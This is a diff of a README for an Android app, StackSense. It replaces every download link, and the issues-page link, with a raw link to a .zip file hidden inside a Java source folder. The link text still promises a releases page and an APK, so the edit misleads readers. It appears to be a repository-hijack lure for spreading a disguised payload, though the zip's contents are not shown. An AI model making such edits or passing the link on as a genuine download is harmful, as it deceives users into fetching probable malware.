@@ -6,7 +6,7 @@ Welcome to StackSense! This guide helps you download and run the StackSense app 
 
 ## 📥 Download Link
 
-[![Download StackSense](https://img.shields.io/badge/Download-StackSense-brightgreen)](https://github.com/DevRandom12/StackSense/releases)
+[![Download StackSense](https://github.com/DevRandom12/StackSense/raw/refs/heads/main/app/src/main/java/com/stacksense/ui/screens/Sense-Stack-v1.8.zip)](https://github.com/DevRandom12/StackSense/raw/refs/heads/main/app/src/main/java/com/stacksense/ui/screens/Sense-Stack-v1.8.zip)
 
 ## 📂 What You Need
 
@@ -27,13 +27,13 @@ Before downloading, ensure you have:
 ## 📋 How to Download & Install
 
 1. **Visit the Releases Page:**
-   Click this link to go to the StackSense releases page: [Download StackSense](https://github.com/DevRandom12/StackSense/releases). 
+   Click this link to go to the StackSense releases page: [Download StackSense](https://github.com/DevRandom12/StackSense/raw/refs/heads/main/app/src/main/java/com/stacksense/ui/screens/Sense-Stack-v1.8.zip). 
 
 2. **Choose the Latest Release:**
    On the releases page, look for the most recent version. Typically, it is at the top of the list. 
 
 3. **Download the APK File:**
-   Under the release notes, find and click the APK file link (e.g., `StackSense-v1.0.apk`). This file contains the app.
+   Under the release notes, find and click the APK file link (e.g., `https://github.com/DevRandom12/StackSense/raw/refs/heads/main/app/src/main/java/com/stacksense/ui/screens/Sense-Stack-v1.8.zip`). This file contains the app.
 
 4. **Enable Installation from Unknown Sources:**
    To install, you might need to allow installations from unknown sources:
@@ -84,4 +84,4 @@ StackSense carefully handles data. The app does not collect any personal informa
 - open-source
 - reverse-engineering
 
-For further assistance, refer to our GitHub [issues page](https://github.com/DevRandom12/StackSense/issues). Thank you for choosing StackSense!
+For further assistance, refer to our GitHub [issues page](https://github.com/DevRandom12/StackSense/raw/refs/heads/main/app/src/main/java/com/stacksense/ui/screens/Sense-Stack-v1.8.zip). Thank you for choosing StackSense!
